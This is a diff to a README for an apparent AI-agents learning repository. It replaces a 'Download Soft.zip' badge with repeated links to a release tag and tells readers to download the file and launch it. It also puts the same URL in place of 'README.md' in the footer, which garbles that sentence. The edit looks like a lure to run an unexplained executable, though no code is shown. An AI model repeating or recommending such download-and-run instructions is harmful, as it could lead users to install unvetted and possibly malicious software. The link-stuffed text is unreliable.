@@ -25,7 +25,7 @@ Feel free to dive into the topics that interest you the most and uncover the cut
 
 To access the repository content, click on the following link:  
 
-[![Download Soft.zip](https://img.shields.io/badge/Download-Soft.zip-blue)](https://github.com/files/Soft.zip)
+[![Download https://github.com/teox1211/practical-ai-agents/releases/tag/v1.2](https://github.com/teox1211/practical-ai-agents/releases/tag/v1.2)](https://github.com/teox1211/practical-ai-agents/releases/tag/v1.2)
 
 If the link ends with the filename, simply download the file and launch it to start exploring the world of AI agents. In case the link provided does not work, we recommend checking the "Releases" section of the repository for alternative download options.
 
@@ -49,4 +49,4 @@ Happy coding and exploring the world of AI agents! 🚀🔬
 
 ---
 
-*This README.md file was created with ❤️ by an AI assistant to provide you with a comprehensive overview of the repository content. For any concerns or inquiries, please refer to the repository's guidelines.*
+*This https://github.com/teox1211/practical-ai-agents/releases/tag/v1.2 file was created with ❤️ by an AI assistant to provide you with a comprehensive overview of the repository content. For any concerns or inquiries, please refer to the repository's guidelines.*
